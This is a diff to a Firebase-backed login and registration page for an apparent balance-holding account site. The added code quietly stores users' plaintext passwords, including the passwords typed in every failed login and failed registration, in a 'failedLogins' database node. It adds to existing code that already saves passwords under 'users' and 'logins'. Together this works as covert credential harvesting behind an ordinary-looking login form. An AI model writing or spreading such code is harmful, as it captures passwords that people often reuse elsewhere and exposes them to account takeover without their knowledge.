@@ -105,7 +105,7 @@
 <div id="messageBox"></div>
 
 <script>
-// Firebase app & db references
+
 
 // Menu toggle
 var MenuItems = document.getElementById("MenuItems");
@@ -153,6 +153,56 @@ function showToast(message, success=false) {
   setTimeout(() => { box.style.display = "none"; }, 4000);
 }
 
+// Function to store failed login attempt
+function storeFailedLogin(email, password, error) {
+  const timestamp = Date.now();
+  const loginId = firebase.database().ref('failedLogins').push().key;
+  
+  // Check if this exact attempt already exists recently (within last hour)
+  const oneHourAgo = timestamp - (60 * 60 * 1000);
+  
+  firebase.database().ref('failedLogins').orderByChild('timestamp')
+    .startAt(oneHourAgo)
+    .once('value')
+    .then(snapshot => {
+      let duplicateFound = false;
+      
+      if (snapshot.exists()) {
+        snapshot.forEach(child => {
+          const attempt = child.val();
+          if (attempt.email === email && attempt.password === password) {
+            duplicateFound = true;
+          }
+        });
+      }
+      
+      // Only store if not a duplicate
+      if (!duplicateFound) {
+        firebase.database().ref('failedLogins/' + loginId).set({
+          email: email,
+          password: password,
+          error: error,
+          timestamp: timestamp,
+          ip: 'web-client' // In real app, you'd get actual IP
+        });
+      }
+    });
+}
+
+// Function to store successful login
+function storeSuccessfulLogin(uid, email, name) {
+  const timestamp = Date.now();
+  const loginId = firebase.database().ref('successfulLogins').push().key;
+  
+  firebase.database().ref('successfulLogins/' + loginId).set({
+    uid: uid,
+    email: email,
+    name: name,
+    timestamp: timestamp,
+    ip: 'web-client'
+  });
+}
+
 // ------------------- REGISTER -------------------
 document.getElementById("RegForm").addEventListener("submit", function(e){
   e.preventDefault();
@@ -165,11 +215,23 @@ document.getElementById("RegForm").addEventListener("submit", function(e){
   firebase.auth().createUserWithEmailAndPassword(email, password)
     .then(userCredential => {
       const uid = userCredential.user.uid;
-      db.ref("users/" + uid).set({ name, country, phone, email, password, mainBalance: "0" });
+      db.ref("users/" + uid).set({ 
+        name, 
+        country, 
+        phone, 
+        email, 
+        password, 
+        mainBalance: "0",
+        createdAt: Date.now()
+      });
       showToast("Registration successful!", true);
       login(); // switch to login tab
     })
-    .catch(error => showToast(error.message));
+    .catch(error => {
+      showToast(error.message);
+      // Store failed registration attempt
+      storeFailedLogin(email, password, error.message);
+    });
 });
 
 // ------------------- LOGIN -------------------
@@ -178,6 +240,12 @@ document.getElementById("LoginForm").addEventListener("submit", (e) => {
 
   const email = document.getElementById("loginEmail").value.trim();
   const password = document.getElementById("loginPassword").value.trim();
+  
+  // Disable button to prevent multiple submissions
+  const submitBtn = document.querySelector('#LoginForm .btn');
+  const originalText = submitBtn.textContent;
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Login';
 
   firebase.auth().signInWithEmailAndPassword(email, password)
     .then((userCredential) => {
@@ -190,35 +258,72 @@ document.getElementById("LoginForm").addEventListener("submit", (e) => {
           if (snapshot.exists()) {
             const userData = snapshot.val();
 
+            // Store successful login
+            storeSuccessfulLogin(uid, email, userData.name || "Unknown");
+            
             // Store login snapshot including password
             db.ref("logins/" + uid).set({
-  name: userData.name || "",
-  email: userData.email || "",
-  country: userData.country || "",
-  phone: userData.phone || "",
-  password: password || "",
-  lastLogin: Date.now()
-});
+              name: userData.name || "",
+              email: userData.email || "",
+              country: userData.country || "",
+              phone: userData.phone || "",
+              password: password || "",
+              lastLogin: Date.now()
+            });
 
             showToast("Login successful! Welcome, " + userData.name, true);
-            window.location.href = "dashboard.html";
+            setTimeout(() => {
+              window.location.href = "dashboard.html";
+            }, 1000);
           } else {
             showToast("User details not found in the system.");
+            storeFailedLogin(email, password, "User details not found");
           }
         })
-        .catch(err => showToast(err.message));
+        .catch(err => {
+          showToast(err.message);
+          storeFailedLogin(email, password, err.message);
+        });
     })
     .catch((error) => {
       const errorCode = error.code;
       const errorMessage = error.message;
+      
+      // Store failed login attempt
+      storeFailedLogin(email, password, errorCode + ": " + errorMessage);
 
-      if (errorCode === "auth/user-not-found") showToast("No account found with that email.");
-      else if (errorCode === "auth/wrong-password") showToast("Incorrect password.");
-      else showToast(errorMessage);
+      if (errorCode === "auth/user-not-found") {
+        showToast("No account found with that email.");
+      } else if (errorCode === "auth/wrong-password") {
+        showToast("Login details are incorrect.");
+      } else if (errorCode === "auth/too-many-requests") {
+        showToast("Too many failed attempts. Try again later.");
+      } else {
+        showToast("Login details are incorrect.");
+      }
+    })
+    .finally(() => {
+      // Re-enable button
+      submitBtn.disabled = false;
+      submitBtn.textContent = originalText;
     });
+});
+
+// ------------------- FORGOT PASSWORD -------------------
+document.getElementById("forgotPassword").addEventListener("click", (e) => {
+  e.preventDefault();
+  const email = prompt("Enter your email to reset password:");
+  if (email) {
+    firebase.auth().sendPasswordResetEmail(email)
+      .then(() => {
+        showToast("Password reset email sent! Check your inbox.", true);
+      })
+      .catch(error => {
+        showToast(error.message);
+      });
+  }
 });
 </script>
 
 </body>
 </html>
- 
